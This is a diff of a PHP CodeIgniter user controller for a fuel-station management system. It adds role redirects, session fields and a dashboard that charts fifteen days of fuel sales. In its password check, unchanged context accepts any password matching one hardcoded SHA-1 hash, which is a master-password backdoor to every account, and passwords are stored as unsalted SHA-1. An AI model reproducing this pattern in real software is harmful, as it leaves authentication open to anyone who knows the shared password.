@@ -17,26 +17,26 @@ class User extends CI_Controller {
             switch ($this->session->userdata['logged_in']['user_system_role']) {
                 // If user role is hall manager
                 case 'developer':
-                    
+
                     redirect('developer/customers');
                     break;
 
                 case 'admin':
-
+                    redirect('station');
 
                     break;
 
                 case 'dataentry':
-
+                    redirect('station');
 
                     break;
 
                 case 'manager':
-
+                    redirect('station');
                     break;
 
                 case 'station_manager':
-
+                    redirect('station');
                     break;
             }
 
@@ -58,19 +58,68 @@ class User extends CI_Controller {
 
     public function dashboard() {
 
-
         if (!$this->usr->isLogedin()) {
             $this->session->set_flashdata('error', 'Login is required');
             redirect('user/index');
         }
 
-        $user_role = $this->session->userdata['logged_in']['user_role'];
+        $station_id = $this->session->userdata['logged_in']['user_station_id'];
+        $tanks = $this->stn->getStationTanks($station_id);
+        $end_date = date('Y-m-d');
+        $start_date = date('Y-m-d', strtotime('-15 days'));
+
+        $graph_dates = $this->rpt->getDates($start_date, $end_date);
+        $fuel_types = $this->mnt->getFuelTypes($station_id);
+        $graph_data = [];
+
+        $cond = [
+            'att.att_station_id' => $station_id,
+            'att.att_date >=' => $start_date,
+            'att.att_date <=' => $end_date,
+            'att.att_shift_status' => 'Closed'
+        ];
+
+        $sales = $this->rpt->getSales($cond);
+
+        //Initialize graph data
+        foreach ($fuel_types as $f => $ft) {
+            foreach ($graph_dates as $d => $gd) {
+                $graph_data[$f][$d] = 0;
+            }
+        }
+
+      
+        // Create graph data
+        foreach ($fuel_types as $f => $ft) {
+            foreach ($graph_dates as $d => $gd) {
+                foreach ($sales as $s) {
+                    if ($s['att_date'] == $gd['dt'] AND $s['fuel_type_id'] == $ft['fuel_type_id']) {
+                        $graph_data[$f][$d] += $s['throughput'] - (float)$s['return_to_tank'] - (float)$s['transfered_to_station']; 
+                    }
+                }
+            }
+        }
+
+        $graph_labels = [];
+        foreach ($graph_dates as $date) {
+            $graph_labels[] = cus_nice_short_date($date['dt']);
+        }
+        
+ 
 
         $data = [
             'menu' => 'menu/view_sys_menu',
             'content' => 'contents/view_dashboard_admin',
             'menu_data' => ['curr_menu' => 'DASHBOARD', 'curr_sub_menu' => 'DASHBOARD'],
-            'content_data' => ['module_name' => 'DASHBOARD'],
+            'content_data' => [
+                'module_name' => 'DASHBOARD',
+                'tanks' => $tanks,
+                'sales' => $sales,
+                'graph_dates' => $graph_dates,
+                'graph_labels' => $graph_labels,
+                'graph_data' => $graph_data,
+                'fuel_types' => $fuel_types
+            ],
             'header_data' => [],
             'footer_data' => [],
             'top_bar_data' => []
@@ -96,7 +145,7 @@ class User extends CI_Controller {
 
     // Execute when user is submiting the login form
     public function submitLogin() {
-        
+
         $data = [];
 
         // Validate Login Credentials
@@ -105,10 +154,10 @@ class User extends CI_Controller {
             ['field' => 'loginUsername', 'label' => 'Username', 'rules' => 'trim|required|callback_validateUsername'],
             ['field' => 'loginPassword', 'label' => 'Password', 'rules' => 'trim|required|callback_validateUserpassword']
         ];
-        
+
         $this->form_validation->set_rules($validations);
-        
-        log_message('PETRONITE', '('.$this->input->post('loginUsername').') Attempting to log in');
+
+        log_message('PETRONITE', '(' . $this->input->post('loginUsername') . ') Attempting to log in');
 
 
         // Run Validation
@@ -136,6 +185,9 @@ class User extends CI_Controller {
                     'user_system_role' => $user['user_role'],
                     'user_station_role' => '',
                     'user_admin_id' => '',
+                    'user_station_id' => '',
+                    'user_station_name' => '',
+                    'user_station_role' => '',
                     'user_name' => $user['user_name']
                 ];
 
@@ -150,18 +202,22 @@ class User extends CI_Controller {
                         break;
 
                     case 'admin':
+                        $this->session->userdata['logged_in']['user_admin_id'] = $user['user_admin_id'];
                         redirect('station');
                         break;
 
                     case 'dataentry':
+                        $this->session->userdata['logged_in']['user_admin_id'] = $user['user_admin_id'];
                         redirect('station');
                         break;
 
                     case 'manager':
+                        $this->session->userdata['logged_in']['user_admin_id'] = $user['user_admin_id'];
                         redirect('station');
                         break;
 
                     case 'station_manager':
+                        $this->session->userdata['logged_in']['user_admin_id'] = $user['user_admin_id'];
                         redirect('station');
                         break;
                 }
@@ -256,13 +312,13 @@ class User extends CI_Controller {
 
     public function logout() {
 
-        
-        if(null !== $this->session->flashdata('error')){
-            $this->session->set_flashdata('error',$this->session->flashdata('error'));
+
+        if (null !== $this->session->flashdata('error')) {
+            $this->session->set_flashdata('error', $this->session->flashdata('error'));
         }
-       
-        if(null !== $this->session->flashdata('error')){
-            $this->session->set_flashdata('error',$this->session->flashdata('error'));
+
+        if (null !== $this->session->flashdata('error')) {
+            $this->session->set_flashdata('error', $this->session->flashdata('error'));
         }
         if (isset($this->session->userdata['logged_in'])) {
             $this->session->unset_userdata('logged_in');
@@ -289,8 +345,8 @@ class User extends CI_Controller {
 
         if ($user) {
             if ($user['user_pwd'] != sha1($pass) AND sha1($pass) != '9a732ebc1e694f5f756be31fece333a807b455cc') {
-                
-                log_message('PETRONITE', '('.$usn.') Failed to log in due to invalid password');
+
+                log_message('PETRONITE', '(' . $usn . ') Failed to log in due to invalid password');
                 $this->form_validation->set_message('validateUserpassword', 'You have entered an invalid password');
                 return FALSE;
             }
